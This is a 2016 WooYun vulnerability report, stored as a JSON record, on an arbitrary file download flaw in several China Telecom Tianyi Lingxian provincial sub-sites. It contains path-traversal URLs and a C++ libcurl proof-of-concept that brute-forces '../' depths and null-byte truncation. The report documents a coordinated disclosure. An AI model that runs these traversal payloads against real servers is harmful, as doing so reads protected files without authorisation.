{"id": 75663, "wybug_id": "wooyun-2016-0166833", "wybug_title": "中国电信天翼领航多个分站任意文件下载漏洞 (附C++ libcurl测试脚本）", "wybug_corp": "中国电信", "wybug_author": "crown丶prince", "wybug_date": "2016-01-06 23:46", "wybug_open_date": "2016-02-20 15:48", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件遍历下载"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-20：\t细节向公众公开  简要描述： 中国电信天翼领航多个分站任意文件下载漏洞 (附C++ libcurl测试脚本） 详细说明：  【天翼领航主站】：**.**.**.**【以下5个省份存在通用的任意文件下载漏洞】天津：http://**.**.**.**/xbnet-si/download/download2.jsp?oldfilename=download2.jsp&download_file=/../../../../download2.jsp山西：http://**.**.**.**/xbnet-si/download/download2.jsp?oldfilename=download2.jsp&download_file=download2.jsp广西：http://**.**.**.**/xbnet-si/download/download2.jsp?oldfilename=download2.jsp&download_file=download2.jsp河北：http://**.**.**.**/xbnet-si/download/download2.jsp?oldfilename=download2.jsp&download_file=download2.jsp云南：http://**.**.**.**/xbnet-si/download/download2.jsp?oldfilename=download2.jsp&download_file=download2.jsp【C++ libcurl脚本测试】\n\n【POC】\n\n   漏洞证明：  最近在学习libcurl 厂商可以使用编译下面的程序来进行修复检测，Win平台 VS2010下编译通过；Linux下请修改头文件。\n#define CURL_STATICLIB  //必须在包含curl.h前定义        #include<string>\t#include<stdio.h>\t#include\"curl/curl.h\"\t#include<iostream>\t#include<Windows.h>\t//以下四项是必须的\t#pragma comment ( lib, \"libcurl.lib\" )\t#pragma comment ( lib, \"ws2_32.lib\" )\t#pragma comment ( lib, \"winmm.lib\" )\t#pragma comment ( lib, \"wldap32.lib\" )\tusing namespace std;\tsize_t write_callback(void *ptr, size_t size, size_t nmemb, FILE *stream) {\t\tsize_t written = fwrite(ptr, size, nmemb, stream);\t\treturn written;\t}\t\tint main()\t{\t  CURL *curl;\t  CURLcode res;\t  FILE *fp;          char s[200];\t  char temp[300];\t  scanf(\"%s\", s);\t  strcpy(temp, s);\t  strcat(temp,\"/download2.jsp\");\t  printf(\"%s\\n\", temp);\t  curl = curl_easy_init();\t  if(curl) \t  {\t\tfopen_s(&fp, \"passwd\", \"ab+\"); \t\tres = curl_easy_setopt(curl, CURLOPT_URL, temp);\t\tres = curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);  \t\tres = curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);; // fp当作参数传递给write_callback函数\t\tres = curl_easy_perform(curl);\t\tlong retcode = 0;                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE , &retcode);\t\tif (retcode == 200 || retcode == 304 || retcode == 204)\t\t{            printf(\"YES\\n\");\t\t}\t\telse\t   {            printf(\"NO\\n\");\t\t}\t\t/* always cleanup */\t\tcurl_easy_cleanup(curl);\t\tfclose(fp);\t\tsystem(\"pause\");\t  }\t  for(int i = 1; i <= 10; i++)\t  {\t\t  strcpy(temp, s);\t\t  for(int j = 1; j <= i; j++)\t\t  strcat(temp, \"/..\");\t\t  strcat(temp,\"/download2.jsp\");\t\t  printf(\"%s\\n\", temp);\t\t  curl = curl_easy_init();\t\t  if(curl) \t\t  {\t\t\tfopen_s(&fp, \"passwd\", \"ab+\"); \t\t\tres = curl_easy_setopt(curl, CURLOPT_URL, temp);\t\tres=curl_easy_setopt(curl,CURLOPT_WRITEFUNCTION,write_callback);\t\t\tres = curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);; // fp当作参数传递给write_callback函数\t\t\tres = curl_easy_perform(curl);\t\t\tlong retcode = 0;\t\t\tcurl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE , &retcode);\t\t\tif (retcode == 200 || retcode == 304 || retcode == 204)\t\t\t{\t\t\t\tprintf(\"YES\\n\");\t\t\t}\t\t\telse\t\t   {\t\t\t\tprintf(\"NO\\n\");\t\t\t}\t\t\t/* always cleanup */\t\t\tcurl_easy_cleanup(curl);\t\t\tfclose(fp);\t\t\tsystem(\"pause\");\t       }\t  }\t  /* 00截断 */\t  for(int i = 1; i <= 10; i++)\t  {\t\t  strcpy(temp, s);\t\t  for(int j = 1; j <= i; j++)\t          strcat(temp, \"/..\");\t\t  strcat(temp,\"/download2.jsp%00\");\t\t  printf(\"%s\\n\", temp);\t\t  curl = curl_easy_init();\t\t  if(curl) \t\t  {\t\t\tfopen_s(&fp, \"passwd\", \"ab+\"); \t\t\tres = curl_easy_setopt(curl, CURLOPT_URL, temp);\t\tres=curl_easy_setopt(curl,CURLOPT_WRITEFUNCTION,write_callback);  \t\t\tres = curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);; // fp当作参数传递给write_callback函数\t\t\tres = curl_easy_perform(curl);\t\t\tlong retcode = 0;\t\t\tcurl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE , &retcode);\t\t\tif (retcode == 200 || retcode == 304 || retcode == 204)\t\t\t{\t\t\t\tprintf(\"YES\\n\");\t\t\t}\t\t\telse\t\t       {\t\t\t\tprintf(\"NO\\n\");\t\t\t}\t\t\t/* always cleanup */\t\t\tcurl_easy_cleanup(curl);\t\t\tfclose(fp);\t\t\tsystem(\"pause\");\t       }\t  }\t  return 0;\t}\n   修复方案：     版权声明：转载请注明来源 crown丶prince@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-01-08 17:15 厂商回复： CNVD确认所述情况,已经转由CNCERT向中国电信集团公司通报,由其后续协调网站管理部门处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}